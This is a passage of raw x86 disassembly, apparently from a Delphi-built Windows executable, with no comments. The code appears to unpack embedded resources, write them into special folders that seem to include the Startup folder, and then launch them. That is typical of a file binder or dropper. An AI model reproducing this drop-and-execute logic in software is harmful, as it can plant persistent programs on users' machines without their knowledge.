  401cc7:	e8 88 fa ff ff       	call   0x401754
  401ccc:	5b                   	pop    %ebx
  401ccd:	c3                   	ret
  401cce:	00 00                	add    %al,(%eax)
  401cd0:	ff                   	(bad)
  401cd1:	ff                   	(bad)
  401cd2:	ff                   	(bad)
  401cd3:	ff 01                	incl   (%ecx)
  401cd5:	00 00                	add    %al,(%eax)
  401cd7:	00 5c 00 00          	add    %bl,0x0(%eax,%eax,1)
  401cdb:	00 55 8b             	add    %dl,-0x75(%ebp)
  401cde:	ec                   	in     (%dx),%al
  401cdf:	81 c4 f4 fe ff ff    	add    $0xfffffef4,%esp
  401ce5:	53                   	push   %ebx
  401ce6:	33 d2                	xor    %edx,%edx
  401ce8:	89 95 f4 fe ff ff    	mov    %edx,-0x10c(%ebp)
  401cee:	8b d8                	mov    %eax,%ebx
  401cf0:	33 c0                	xor    %eax,%eax
  401cf2:	55                   	push   %ebp
  401cf3:	68 50 1d 40 00       	push   $0x401d50
  401cf8:	64 ff 30             	push   %fs:(%eax)
  401cfb:	64 89 20             	mov    %esp,%fs:(%eax)
  401cfe:	68 04 01 00 00       	push   $0x104
  401d03:	8d 85 fb fe ff ff    	lea    -0x105(%ebp),%eax
  401d09:	50                   	push   %eax
  401d0a:	e8 35 ff ff ff       	call   0x401c44
  401d0f:	8d 85 f4 fe ff ff    	lea    -0x10c(%ebp),%eax
  401d15:	8d 95 fb fe ff ff    	lea    -0x105(%ebp),%edx
  401d1b:	b9 05 01 00 00       	mov    $0x105,%ecx
  401d20:	e8 0f fa ff ff       	call   0x401734
  401d25:	8b 95 f4 fe ff ff    	mov    -0x10c(%ebp),%edx
  401d2b:	8b c3                	mov    %ebx,%eax
  401d2d:	b9 64 1d 40 00       	mov    $0x401d64,%ecx
  401d32:	e8 61 fa ff ff       	call   0x401798
  401d37:	33 c0                	xor    %eax,%eax
  401d39:	5a                   	pop    %edx
  401d3a:	59                   	pop    %ecx
  401d3b:	59                   	pop    %ecx
  401d3c:	64 89 10             	mov    %edx,%fs:(%eax)
  401d3f:	68 57 1d 40 00       	push   $0x401d57
  401d44:	8d 85 f4 fe ff ff    	lea    -0x10c(%ebp),%eax
  401d4a:	e8 e5 f8 ff ff       	call   0x401634
  401d4f:	c3                   	ret
  401d50:	e9 af f6 ff ff       	jmp    0x401404
  401d55:	eb ed                	jmp    0x401d44
  401d57:	5b                   	pop    %ebx
  401d58:	8b e5                	mov    %ebp,%esp
  401d5a:	5d                   	pop    %ebp
  401d5b:	c3                   	ret
  401d5c:	ff                   	(bad)
  401d5d:	ff                   	(bad)
  401d5e:	ff                   	(bad)
  401d5f:	ff 01                	incl   (%ecx)
  401d61:	00 00                	add    %al,(%eax)
  401d63:	00 5c 00 00          	add    %bl,0x0(%eax,%eax,1)
  401d67:	00 55 8b             	add    %dl,-0x75(%ebp)
  401d6a:	ec                   	in     (%dx),%al
  401d6b:	81 c4 f4 fe ff ff    	add    $0xfffffef4,%esp
  401d71:	53                   	push   %ebx
  401d72:	33 d2                	xor    %edx,%edx
  401d74:	89 95 f4 fe ff ff    	mov    %edx,-0x10c(%ebp)
  401d7a:	8b d8                	mov    %eax,%ebx
  401d7c:	33 c0                	xor    %eax,%eax
  401d7e:	55                   	push   %ebp
  401d7f:	68 dc 1d 40 00       	push   $0x401ddc
  401d84:	64 ff 30             	push   %fs:(%eax)
  401d87:	64 89 20             	mov    %esp,%fs:(%eax)
  401d8a:	68 04 01 00 00       	push   $0x104
  401d8f:	8d 85 fb fe ff ff    	lea    -0x105(%ebp),%eax
  401d95:	50                   	push   %eax
  401d96:	e8 99 fe ff ff       	call   0x401c34
  401d9b:	8d 85 f4 fe ff ff    	lea    -0x10c(%ebp),%eax
  401da1:	8d 95 fb fe ff ff    	lea    -0x105(%ebp),%edx
  401da7:	b9 05 01 00 00       	mov    $0x105,%ecx
  401dac:	e8 83 f9 ff ff       	call   0x401734
  401db1:	8b 95 f4 fe ff ff    	mov    -0x10c(%ebp),%edx
  401db7:	8b c3                	mov    %ebx,%eax
  401db9:	b9 f0 1d 40 00       	mov    $0x401df0,%ecx
  401dbe:	e8 d5 f9 ff ff       	call   0x401798
  401dc3:	33 c0                	xor    %eax,%eax
  401dc5:	5a                   	pop    %edx
  401dc6:	59                   	pop    %ecx
  401dc7:	59                   	pop    %ecx
  401dc8:	64 89 10             	mov    %edx,%fs:(%eax)
  401dcb:	68 e3 1d 40 00       	push   $0x401de3
  401dd0:	8d 85 f4 fe ff ff    	lea    -0x10c(%ebp),%eax
  401dd6:	e8 59 f8 ff ff       	call   0x401634
  401ddb:	c3                   	ret
  401ddc:	e9 23 f6 ff ff       	jmp    0x401404
  401de1:	eb ed                	jmp    0x401dd0
  401de3:	5b                   	pop    %ebx
  401de4:	8b e5                	mov    %ebp,%esp
  401de6:	5d                   	pop    %ebp
  401de7:	c3                   	ret
  401de8:	ff                   	(bad)
  401de9:	ff                   	(bad)
  401dea:	ff                   	(bad)
  401deb:	ff 01                	incl   (%ecx)
  401ded:	00 00                	add    %al,(%eax)
  401def:	00 5c 00 00          	add    %bl,0x0(%eax,%eax,1)
  401df3:	00 53 81             	add    %dl,-0x7f(%ebx)
  401df6:	c4                   	(bad)
  401df7:	f8                   	clc
  401df8:	fe                   	(bad)
  401df9:	ff                   	(bad)
  401dfa:	ff 8b d8 54 68 04    	decl   0x46854d8(%ebx)
  401e00:	01 00                	add    %eax,(%eax)
  401e02:	00 e8                	add    %ch,%al
  401e04:	34 fe                	xor    $0xfe,%al
  401e06:	ff                   	(bad)
  401e07:	ff 8b c3 8b d4 b9    	decl   -0x462b743d(%ebx)
  401e0d:	05 01 00 00 e8       	add    $0xe8000001,%eax
  401e12:	1e                   	push   %ds
  401e13:	f9                   	stc
  401e14:	ff                   	(bad)
  401e15:	ff 81 c4 08 01 00    	incl   0x108c4(%ecx)
  401e1b:	00 5b c3             	add    %bl,-0x3d(%ebx)
  401e1e:	8b c0                	mov    %eax,%eax
  401e20:	ff 25 d8 50 40 00    	jmp    *0x4050d8
  401e26:	8b c0                	mov    %eax,%eax
  401e28:	55                   	push   %ebp
  401e29:	8b ec                	mov    %esp,%ebp
  401e2b:	81 c4 f4 fe ff ff    	add    $0xfffffef4,%esp
  401e31:	53                   	push   %ebx
  401e32:	33 d2                	xor    %edx,%edx
  401e34:	89 95 f4 fe ff ff    	mov    %edx,-0x10c(%ebp)
  401e3a:	8b d8                	mov    %eax,%ebx
  401e3c:	33 c0                	xor    %eax,%eax
  401e3e:	55                   	push   %ebp
  401e3f:	68 9f 1e 40 00       	push   $0x401e9f
  401e44:	64 ff 30             	push   %fs:(%eax)
  401e47:	64 89 20             	mov    %esp,%fs:(%eax)
  401e4a:	8d 85 fb fe ff ff    	lea    -0x105(%ebp),%eax
  401e50:	50                   	push   %eax
  401e51:	6a 00                	push   $0x0
  401e53:	6a 00                	push   $0x0
  401e55:	6a 26                	push   $0x26
  401e57:	6a 00                	push   $0x0
  401e59:	e8 c2 ff ff ff       	call   0x401e20
  401e5e:	8d 85 f4 fe ff ff    	lea    -0x10c(%ebp),%eax
  401e64:	8d 95 fb fe ff ff    	lea    -0x105(%ebp),%edx
  401e6a:	b9 05 01 00 00       	mov    $0x105,%ecx
  401e6f:	e8 c0 f8 ff ff       	call   0x401734
  401e74:	8b 95 f4 fe ff ff    	mov    -0x10c(%ebp),%edx
  401e7a:	8b c3                	mov    %ebx,%eax
  401e7c:	b9 b4 1e 40 00       	mov    $0x401eb4,%ecx
  401e81:	e8 12 f9 ff ff       	call   0x401798
  401e86:	33 c0                	xor    %eax,%eax
  401e88:	5a                   	pop    %edx
  401e89:	59                   	pop    %ecx
  401e8a:	59                   	pop    %ecx
  401e8b:	64 89 10             	mov    %edx,%fs:(%eax)
  401e8e:	68 a6 1e 40 00       	push   $0x401ea6
  401e93:	8d 85 f4 fe ff ff    	lea    -0x10c(%ebp),%eax
  401e99:	e8 96 f7 ff ff       	call   0x401634
  401e9e:	c3                   	ret
  401e9f:	e9 60 f5 ff ff       	jmp    0x401404
  401ea4:	eb ed                	jmp    0x401e93
  401ea6:	5b                   	pop    %ebx
  401ea7:	8b e5                	mov    %ebp,%esp
  401ea9:	5d                   	pop    %ebp
  401eaa:	c3                   	ret
  401eab:	00 ff                	add    %bh,%bh
  401ead:	ff                   	(bad)
  401eae:	ff                   	(bad)
  401eaf:	ff 01                	incl   (%ecx)
  401eb1:	00 00                	add    %al,(%eax)
  401eb3:	00 5c 00 00          	add    %bl,0x0(%eax,%eax,1)
  401eb7:	00 55 8b             	add    %dl,-0x75(%ebp)
  401eba:	ec                   	in     (%dx),%al
  401ebb:	81 c4 f4 fe ff ff    	add    $0xfffffef4,%esp
  401ec1:	53                   	push   %ebx
  401ec2:	33 d2                	xor    %edx,%edx
  401ec4:	89 95 f4 fe ff ff    	mov    %edx,-0x10c(%ebp)
  401eca:	8b d8                	mov    %eax,%ebx
  401ecc:	33 c0                	xor    %eax,%eax
  401ece:	55                   	push   %ebp
  401ecf:	68 2f 1f 40 00       	push   $0x401f2f
  401ed4:	64 ff 30             	push   %fs:(%eax)
  401ed7:	64 89 20             	mov    %esp,%fs:(%eax)
  401eda:	8d 85 fb fe ff ff    	lea    -0x105(%ebp),%eax
  401ee0:	50                   	push   %eax
  401ee1:	6a 00                	push   $0x0
  401ee3:	6a 00                	push   $0x0
  401ee5:	6a 07                	push   $0x7
  401ee7:	6a 00                	push   $0x0
  401ee9:	e8 32 ff ff ff       	call   0x401e20
  401eee:	8d 85 f4 fe ff ff    	lea    -0x10c(%ebp),%eax
  401ef4:	8d 95 fb fe ff ff    	lea    -0x105(%ebp),%edx
  401efa:	b9 05 01 00 00       	mov    $0x105,%ecx
  401eff:	e8 30 f8 ff ff       	call   0x401734
  401f04:	8b 95 f4 fe ff ff    	mov    -0x10c(%ebp),%edx
  401f0a:	8b c3                	mov    %ebx,%eax
  401f0c:	b9 44 1f 40 00       	mov    $0x401f44,%ecx
  401f11:	e8 82 f8 ff ff       	call   0x401798
  401f16:	33 c0                	xor    %eax,%eax
  401f18:	5a                   	pop    %edx
  401f19:	59                   	pop    %ecx
  401f1a:	59                   	pop    %ecx
  401f1b:	64 89 10             	mov    %edx,%fs:(%eax)
  401f1e:	68 36 1f 40 00       	push   $0x401f36
  401f23:	8d 85 f4 fe ff ff    	lea    -0x10c(%ebp),%eax
  401f29:	e8 06 f7 ff ff       	call   0x401634
  401f2e:	c3                   	ret
  401f2f:	e9 d0 f4 ff ff       	jmp    0x401404
  401f34:	eb ed                	jmp    0x401f23
  401f36:	5b                   	pop    %ebx
  401f37:	8b e5                	mov    %ebp,%esp
  401f39:	5d                   	pop    %ebp
  401f3a:	c3                   	ret
  401f3b:	00 ff                	add    %bh,%bh
  401f3d:	ff                   	(bad)
  401f3e:	ff                   	(bad)
  401f3f:	ff 01                	incl   (%ecx)
  401f41:	00 00                	add    %al,(%eax)
  401f43:	00 5c 00 00          	add    %bl,0x0(%eax,%eax,1)
  401f47:	00 55 8b             	add    %dl,-0x75(%ebp)
  401f4a:	ec                   	in     (%dx),%al
  401f4b:	83 c4 f8             	add    $0xfffffff8,%esp
  401f4e:	53                   	push   %ebx
  401f4f:	56                   	push   %esi
  401f50:	57                   	push   %edi
  401f51:	8b fa                	mov    %edx,%edi
  401f53:	89 45 fc             	mov    %eax,-0x4(%ebp)
  401f56:	8b 45 fc             	mov    -0x4(%ebp),%eax
  401f59:	e8 52 f9 ff ff       	call   0x4018b0
  401f5e:	33 c0                	xor    %eax,%eax
  401f60:	55                   	push   %ebp
  401f61:	68 ea 1f 40 00       	push   $0x401fea
  401f66:	64 ff 30             	push   %fs:(%eax)
  401f69:	64 89 20             	mov    %esp,%fs:(%eax)
  401f6c:	8b c7                	mov    %edi,%eax
  401f6e:	e8 c1 f6 ff ff       	call   0x401634
  401f73:	6a 0a                	push   $0xa
  401f75:	8b 45 fc             	mov    -0x4(%ebp),%eax
  401f78:	e8 43 f9 ff ff       	call   0x4018c0
  401f7d:	50                   	push   %eax
  401f7e:	a1 6c 46 40 00       	mov    0x40466c,%eax
  401f83:	50                   	push   %eax
  401f84:	e8 9b fc ff ff       	call   0x401c24
  401f89:	8b d8                	mov    %eax,%ebx
  401f8b:	85 db                	test   %ebx,%ebx
  401f8d:	74 45                	je     0x401fd4
  401f8f:	53                   	push   %ebx
  401f90:	a1 6c 46 40 00       	mov    0x40466c,%eax
  401f95:	50                   	push   %eax
  401f96:	e8 c9 fc ff ff       	call   0x401c64
  401f9b:	8b f0                	mov    %eax,%esi
  401f9d:	85 f6                	test   %esi,%esi
  401f9f:	76 33                	jbe    0x401fd4
  401fa1:	53                   	push   %ebx
  401fa2:	a1 6c 46 40 00       	mov    0x40466c,%eax
  401fa7:	50                   	push   %eax
  401fa8:	e8 9f fc ff ff       	call   0x401c4c
  401fad:	8b d8                	mov    %eax,%ebx
  401faf:	85 db                	test   %ebx,%ebx
  401fb1:	74 21                	je     0x401fd4
  401fb3:	53                   	push   %ebx
  401fb4:	e8 9b fc ff ff       	call   0x401c54
  401fb9:	89 45 f8             	mov    %eax,-0x8(%ebp)
  401fbc:	83 7d f8 00          	cmpl   $0x0,-0x8(%ebp)
  401fc0:	74 0c                	je     0x401fce
  401fc2:	8b c7                	mov    %edi,%eax
  401fc4:	8b ce                	mov    %esi,%ecx
  401fc6:	8b 55 f8             	mov    -0x8(%ebp),%edx
  401fc9:	e8 2a f7 ff ff       	call   0x4016f8
  401fce:	53                   	push   %ebx
  401fcf:	e8 58 fc ff ff       	call   0x401c2c
  401fd4:	33 c0                	xor    %eax,%eax
  401fd6:	5a                   	pop    %edx
  401fd7:	59                   	pop    %ecx
  401fd8:	59                   	pop    %ecx
  401fd9:	64 89 10             	mov    %edx,%fs:(%eax)
  401fdc:	68 f1 1f 40 00       	push   $0x401ff1
  401fe1:	8d 45 fc             	lea    -0x4(%ebp),%eax
  401fe4:	e8 4b f6 ff ff       	call   0x401634
  401fe9:	c3                   	ret
  401fea:	e9 15 f4 ff ff       	jmp    0x401404
  401fef:	eb f0                	jmp    0x401fe1
  401ff1:	5f                   	pop    %edi
  401ff2:	5e                   	pop    %esi
  401ff3:	5b                   	pop    %ebx
  401ff4:	59                   	pop    %ecx
  401ff5:	59                   	pop    %ecx
  401ff6:	5d                   	pop    %ebp
  401ff7:	c3                   	ret
  401ff8:	53                   	push   %ebx
  401ff9:	56                   	push   %esi
  401ffa:	81 c4 00 ff ff ff    	add    $0xffffff00,%esp
  402000:	8b f2                	mov    %edx,%esi
  402002:	8b d8                	mov    %eax,%ebx
  402004:	8b d4                	mov    %esp,%edx
  402006:	8b c3                	mov    %ebx,%eax
  402008:	e8 d7 f2 ff ff       	call   0x4012e4
  40200d:	8b d4                	mov    %esp,%edx
  40200f:	8b c6                	mov    %esi,%eax
  402011:	e8 12 f7 ff ff       	call   0x401728
  402016:	81 c4 00 01 00 00    	add    $0x100,%esp
  40201c:	5e                   	pop    %esi
  40201d:	5b                   	pop    %ebx
  40201e:	c3                   	ret
  40201f:	90                   	nop
  402020:	55                   	push   %ebp
  402021:	8b ec                	mov    %esp,%ebp
  402023:	83 c4 f8             	add    $0xfffffff8,%esp
  402026:	89 45 fc             	mov    %eax,-0x4(%ebp)
  402029:	8b 45 fc             	mov    -0x4(%ebp),%eax
  40202c:	e8 7f f8 ff ff       	call   0x4018b0
  402031:	33 c0                	xor    %eax,%eax
  402033:	55                   	push   %ebp
  402034:	68 63 20 40 00       	push   $0x402063
  402039:	64 ff 30             	push   %fs:(%eax)
  40203c:	64 89 20             	mov    %esp,%fs:(%eax)
  40203f:	8d 55 f8             	lea    -0x8(%ebp),%edx
  402042:	8b 45 fc             	mov    -0x4(%ebp),%eax
  402045:	e8 a6 f2 ff ff       	call   0x4012f0
  40204a:	89 45 f8             	mov    %eax,-0x8(%ebp)
  40204d:	33 c0                	xor    %eax,%eax
  40204f:	5a                   	pop    %edx
  402050:	59                   	pop    %ecx
  402051:	59                   	pop    %ecx
  402052:	64 89 10             	mov    %edx,%fs:(%eax)
  402055:	68 6a 20 40 00       	push   $0x40206a
  40205a:	8d 45 fc             	lea    -0x4(%ebp),%eax
  40205d:	e8 d2 f5 ff ff       	call   0x401634
  402062:	c3                   	ret
  402063:	e9 9c f3 ff ff       	jmp    0x401404
  402068:	eb f0                	jmp    0x40205a
  40206a:	8b 45 f8             	mov    -0x8(%ebp),%eax
  40206d:	59                   	pop    %ecx
  40206e:	59                   	pop    %ecx
  40206f:	5d                   	pop    %ebp
  402070:	c3                   	ret
  402071:	8d 40 00             	lea    0x0(%eax),%eax
  402074:	55                   	push   %ebp
  402075:	8b ec                	mov    %esp,%ebp
  402077:	33 c0                	xor    %eax,%eax
  402079:	55                   	push   %ebp
  40207a:	68 93 20 40 00       	push   $0x402093
  40207f:	64 ff 30             	push   %fs:(%eax)
  402082:	64 89 20             	mov    %esp,%fs:(%eax)
  402085:	33 c0                	xor    %eax,%eax
  402087:	5a                   	pop    %edx
  402088:	59                   	pop    %ecx
  402089:	59                   	pop    %ecx
  40208a:	64 89 10             	mov    %edx,%fs:(%eax)
  40208d:	68 9a 20 40 00       	push   $0x40209a
  402092:	c3                   	ret
  402093:	e9 6c f3 ff ff       	jmp    0x401404
  402098:	eb f8                	jmp    0x402092
  40209a:	5d                   	pop    %ebp
  40209b:	c3                   	ret
  40209c:	05 00 00 00 a4       	add    $0xa4000000,%eax
  4020a1:	20 40 00             	and    %al,0x0(%eax)
  4020a4:	d4 1b                	aam    $0x1b
  4020a6:	40                   	inc    %eax
  4020a7:	00 98 1b 40 00 30    	add    %bl,0x3000401b(%eax)
  4020ad:	1a 40 00             	sbb    0x0(%eax),%al
  4020b0:	f4                   	hlt
  4020b1:	19 40 00             	sbb    %eax,0x0(%eax)
  4020b4:	0c 1c                	or     $0x1c,%al
  4020b6:	40                   	inc    %eax
  4020b7:	00 dc                	add    %bl,%ah
  4020b9:	1b 40 00             	sbb    0x0(%eax),%eax
  4020bc:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  4020bd:	1c 40                	sbb    $0x40,%al
  4020bf:	00 74 1c 40          	add    %dh,0x40(%esp,%ebx,1)
  4020c3:	00 00                	add    %al,(%eax)
  4020c5:	00 00                	add    %al,(%eax)
  4020c7:	00 74 20 40          	add    %dh,0x40(%eax,%eiz,1)
  4020cb:	00 55 8b             	add    %dl,-0x75(%ebp)
  4020ce:	ec                   	in     (%dx),%al
  4020cf:	b9 0c 00 00 00       	mov    $0xc,%ecx
  4020d4:	6a 00                	push   $0x0
  4020d6:	6a 00                	push   $0x0
  4020d8:	49                   	dec    %ecx
  4020d9:	75 f9                	jne    0x4020d4
  4020db:	51                   	push   %ecx
  4020dc:	53                   	push   %ebx
  4020dd:	56                   	push   %esi
  4020de:	57                   	push   %edi
  4020df:	b8 9c 20 40 00       	mov    $0x40209c,%eax
  4020e4:	e8 6b fa ff ff       	call   0x401b54
  4020e9:	33 c0                	xor    %eax,%eax
  4020eb:	55                   	push   %ebp
  4020ec:	68 61 23 40 00       	push   $0x402361
  4020f1:	64 ff 30             	push   %fs:(%eax)
  4020f4:	64 89 20             	mov    %esp,%fs:(%eax)
  4020f7:	8d 55 ec             	lea    -0x14(%ebp),%edx
  4020fa:	b8 78 23 40 00       	mov    $0x402378,%eax
  4020ff:	e8 44 fe ff ff       	call   0x401f48
  402104:	8b 45 ec             	mov    -0x14(%ebp),%eax
  402107:	e8 14 ff ff ff       	call   0x402020
  40210c:	8b f8                	mov    %eax,%edi
  40210e:	85 ff                	test   %edi,%edi
  402110:	0f 8e 30 02 00 00    	jle    0x402346
  402116:	bb 01 00 00 00       	mov    $0x1,%ebx
  40211b:	8d 55 e0             	lea    -0x20(%ebp),%edx
  40211e:	8b c3                	mov    %ebx,%eax
  402120:	e8 d3 fe ff ff       	call   0x401ff8
  402125:	8b 4d e0             	mov    -0x20(%ebp),%ecx
  402128:	8d 45 e4             	lea    -0x1c(%ebp),%eax
  40212b:	ba 84 23 40 00       	mov    $0x402384,%edx
  402130:	e8 63 f6 ff ff       	call   0x401798
  402135:	8b 45 e4             	mov    -0x1c(%ebp),%eax
  402138:	8d 55 e8             	lea    -0x18(%ebp),%edx
  40213b:	e8 08 fe ff ff       	call   0x401f48
  402140:	8b 55 e8             	mov    -0x18(%ebp),%edx
  402143:	b8 80 46 40 00       	mov    $0x404680,%eax
  402148:	e8 3b f5 ff ff       	call   0x401688
  40214d:	8d 55 d4             	lea    -0x2c(%ebp),%edx
  402150:	8b c3                	mov    %ebx,%eax
  402152:	e8 a1 fe ff ff       	call   0x401ff8
  402157:	8b 4d d4             	mov    -0x2c(%ebp),%ecx
  40215a:	8d 45 d8             	lea    -0x28(%ebp),%eax
  40215d:	ba 90 23 40 00       	mov    $0x402390,%edx
  402162:	e8 31 f6 ff ff       	call   0x401798
  402167:	8b 45 d8             	mov    -0x28(%ebp),%eax
  40216a:	8d 55 dc             	lea    -0x24(%ebp),%edx
  40216d:	e8 d6 fd ff ff       	call   0x401f48
  402172:	8b 55 dc             	mov    -0x24(%ebp),%edx
  402175:	b8 84 46 40 00       	mov    $0x404684,%eax
  40217a:	e8 09 f5 ff ff       	call   0x401688
  40217f:	8d 55 c8             	lea    -0x38(%ebp),%edx
  402182:	8b c3                	mov    %ebx,%eax
  402184:	e8 6f fe ff ff       	call   0x401ff8
  402189:	8b 4d c8             	mov    -0x38(%ebp),%ecx
  40218c:	8d 45 cc             	lea    -0x34(%ebp),%eax
  40218f:	ba 9c 23 40 00       	mov    $0x40239c,%edx
  402194:	e8 ff f5 ff ff       	call   0x401798
  402199:	8b 45 cc             	mov    -0x34(%ebp),%eax
  40219c:	8d 55 d0             	lea    -0x30(%ebp),%edx
  40219f:	e8 a4 fd ff ff       	call   0x401f48
  4021a4:	8b 45 d0             	mov    -0x30(%ebp),%eax
  4021a7:	e8 74 fe ff ff       	call   0x402020
  4021ac:	8b f0                	mov    %eax,%esi
  4021ae:	8d 55 bc             	lea    -0x44(%ebp),%edx
  4021b1:	8b c3                	mov    %ebx,%eax
  4021b3:	e8 40 fe ff ff       	call   0x401ff8
  4021b8:	8b 4d bc             	mov    -0x44(%ebp),%ecx
  4021bb:	8d 45 c0             	lea    -0x40(%ebp),%eax
  4021be:	ba a8 23 40 00       	mov    $0x4023a8,%edx
  4021c3:	e8 d0 f5 ff ff       	call   0x401798
  4021c8:	8b 45 c0             	mov    -0x40(%ebp),%eax
  4021cb:	8d 55 c4             	lea    -0x3c(%ebp),%edx
  4021ce:	e8 75 fd ff ff       	call   0x401f48
  4021d3:	8b 55 c4             	mov    -0x3c(%ebp),%edx
  4021d6:	b8 88 46 40 00       	mov    $0x404688,%eax
  4021db:	e8 a8 f4 ff ff       	call   0x401688
  4021e0:	83 fe 06             	cmp    $0x6,%esi
  4021e3:	0f 87 ab 00 00 00    	ja     0x402294
  4021e9:	ff 24 b5 f0 21 40 00 	jmp    *0x4021f0(,%esi,4)
  4021f0:	94                   	xchg   %eax,%esp
  4021f1:	22 40 00             	and    0x0(%eax),%al
  4021f4:	0c 22                	or     $0x22,%al
  4021f6:	40                   	inc    %eax
  4021f7:	00 23                	add    %ah,(%ebx)
  4021f9:	22 40 00             	and    0x0(%eax),%al
  4021fc:	3a 22                	cmp    (%edx),%ah
  4021fe:	40                   	inc    %eax
  4021ff:	00 51 22             	add    %dl,0x22(%ecx)
  402202:	40                   	inc    %eax
  402203:	00 68 22             	add    %ch,0x22(%eax)
  402206:	40                   	inc    %eax
  402207:	00 7f 22             	add    %bh,0x22(%edi)
  40220a:	40                   	inc    %eax
  40220b:	00 8d 45 b8 e8 e0    	add    %cl,-0x1f1747bb(%ebp)
  402211:	fb                   	sti
  402212:	ff                   	(bad)
  402213:	ff 8b 55 b8 b8 8c    	decl   -0x734747ab(%ebx)
  402219:	46                   	inc    %esi
  40221a:	40                   	inc    %eax
  40221b:	00 e8                	add    %ch,%al
  40221d:	67 f4                	addr16 hlt
  40221f:	ff                   	(bad)
  402220:	ff                   	ljmp   (bad)
  402221:	eb 71                	jmp    0x402294
  402223:	8d 45 b4             	lea    -0x4c(%ebp),%eax
  402226:	e8 b1 fa ff ff       	call   0x401cdc
  40222b:	8b 55 b4             	mov    -0x4c(%ebp),%edx
  40222e:	b8 8c 46 40 00       	mov    $0x40468c,%eax
  402233:	e8 50 f4 ff ff       	call   0x401688
  402238:	eb 5a                	jmp    0x402294
  40223a:	8d 45 b0             	lea    -0x50(%ebp),%eax
  40223d:	e8 26 fb ff ff       	call   0x401d68
  402242:	8b 55 b0             	mov    -0x50(%ebp),%edx
  402245:	b8 8c 46 40 00       	mov    $0x40468c,%eax
  40224a:	e8 39 f4 ff ff       	call   0x401688
  40224f:	eb 43                	jmp    0x402294
  402251:	8d 45 ac             	lea    -0x54(%ebp),%eax
  402254:	e8 cf fb ff ff       	call   0x401e28
  402259:	8b 55 ac             	mov    -0x54(%ebp),%edx
  40225c:	b8 8c 46 40 00       	mov    $0x40468c,%eax
  402261:	e8 22 f4 ff ff       	call   0x401688
  402266:	eb 2c                	jmp    0x402294
  402268:	8d 45 a8             	lea    -0x58(%ebp),%eax
  40226b:	e8 48 fc ff ff       	call   0x401eb8
  402270:	8b 55 a8             	mov    -0x58(%ebp),%edx
  402273:	b8 8c 46 40 00       	mov    $0x40468c,%eax
  402278:	e8 0b f4 ff ff       	call   0x401688
  40227d:	eb 15                	jmp    0x402294
  40227f:	8d 45 a4             	lea    -0x5c(%ebp),%eax
  402282:	e8 2d fa ff ff       	call   0x401cb4
  402287:	8b 55 a4             	mov    -0x5c(%ebp),%edx
  40228a:	b8 8c 46 40 00       	mov    $0x40468c,%eax
  40228f:	e8 f4 f3 ff ff       	call   0x401688
  402294:	6a 00                	push   $0x0
  402296:	6a 02                	push   $0x2
  402298:	6a 02                	push   $0x2
  40229a:	6a 00                	push   $0x0
  40229c:	6a 02                	push   $0x2
  40229e:	68 00 00 00 40       	push   $0x40000000
  4022a3:	8d 45 a0             	lea    -0x60(%ebp),%eax
  4022a6:	8b 0d 84 46 40 00    	mov    0x404684,%ecx
  4022ac:	8b 15 8c 46 40 00    	mov    0x40468c,%edx
  4022b2:	e8 e1 f4 ff ff       	call   0x401798
  4022b7:	8b 45 a0             	mov    -0x60(%ebp),%eax
  4022ba:	e8 01 f6 ff ff       	call   0x4018c0
  4022bf:	50                   	push   %eax
  4022c0:	e8 57 f9 ff ff       	call   0x401c1c
  4022c5:	8b f0                	mov    %eax,%esi
  4022c7:	83 fe ff             	cmp    $0xffffffff,%esi
  4022ca:	74 72                	je     0x40233e
  4022cc:	6a 00                	push   $0x0
  4022ce:	6a 00                	push   $0x0
  4022d0:	6a 00                	push   $0x0
  4022d2:	56                   	push   %esi
  4022d3:	e8 84 f9 ff ff       	call   0x401c5c
  4022d8:	6a 00                	push   $0x0
  4022da:	68 90 46 40 00       	push   $0x404690
  4022df:	a1 80 46 40 00       	mov    0x404680,%eax
  4022e4:	e8 63 f4 ff ff       	call   0x40174c
  4022e9:	50                   	push   %eax
  4022ea:	b8 80 46 40 00       	mov    $0x404680,%eax
  4022ef:	e8 18 f6 ff ff       	call   0x40190c
  4022f4:	50                   	push   %eax
  4022f5:	56                   	push   %esi
  4022f6:	e8 71 f9 ff ff       	call   0x401c6c
  4022fb:	56                   	push   %esi
  4022fc:	e8 13 f9 ff ff       	call   0x401c14
  402301:	a1 88 46 40 00       	mov    0x404688,%eax
  402306:	ba b4 23 40 00       	mov    $0x4023b4,%edx
  40230b:	e8 fc f4 ff ff       	call   0x40180c
  402310:	75 2c                	jne    0x40233e
  402312:	6a 01                	push   $0x1
  402314:	6a 00                	push   $0x0
  402316:	6a 00                	push   $0x0
  402318:	8d 45 9c             	lea    -0x64(%ebp),%eax
  40231b:	8b 0d 84 46 40 00    	mov    0x404684,%ecx
  402321:	8b 15 8c 46 40 00    	mov    0x40468c,%edx
  402327:	e8 6c f4 ff ff       	call   0x401798
  40232c:	8b 45 9c             	mov    -0x64(%ebp),%eax
  40232f:	e8 8c f5 ff ff       	call   0x4018c0
  402334:	50                   	push   %eax
  402335:	6a 00                	push   $0x0
  402337:	6a 00                	push   $0x0
  402339:	e8 6e f9 ff ff       	call   0x401cac
  40233e:	43                   	inc    %ebx
  40233f:	4f                   	dec    %edi
  402340:	0f 85 d5 fd ff ff    	jne    0x40211b
  402346:	33 c0                	xor    %eax,%eax
  402348:	5a                   	pop    %edx
  402349:	59                   	pop    %ecx
  40234a:	59                   	pop    %ecx
  40234b:	64 89 10             	mov    %edx,%fs:(%eax)
  40234e:	68 68 23 40 00       	push   $0x402368
  402353:	8d 45 9c             	lea    -0x64(%ebp),%eax
  402356:	ba 15 00 00 00       	mov    $0x15,%edx
  40235b:	e8 f8 f2 ff ff       	call   0x401658
  402360:	c3                   	ret
  402361:	e9 9e f0 ff ff       	jmp    0x401404
  402366:	eb eb                	jmp    0x402353
  402368:	5f                   	pop    %edi
  402369:	5e                   	pop    %esi
  40236a:	5b                   	pop    %ebx
  40236b:	e8 dc f1 ff ff       	call   0x40154c
  402370:	ff                   	(bad)
  402371:	ff                   	(bad)
  402372:	ff                   	(bad)
  402373:	ff 02                	incl   (%edx)
  402375:	00 00                	add    %al,(%eax)
  402377:	00 45 31             	add    %al,0x31(%ebp)
  40237a:	00 00                	add    %al,(%eax)
  40237c:	ff                   	(bad)
  40237d:	ff                   	(bad)
  40237e:	ff                   	(bad)
  40237f:	ff 01                	incl   (%ecx)
  402381:	00 00                	add    %al,(%eax)
  402383:	00 41 00             	add    %al,0x0(%ecx)
  402386:	00 00                	add    %al,(%eax)
  402388:	ff                   	(bad)
  402389:	ff                   	(bad)
  40238a:	ff                   	(bad)
  40238b:	ff 01                	incl   (%ecx)
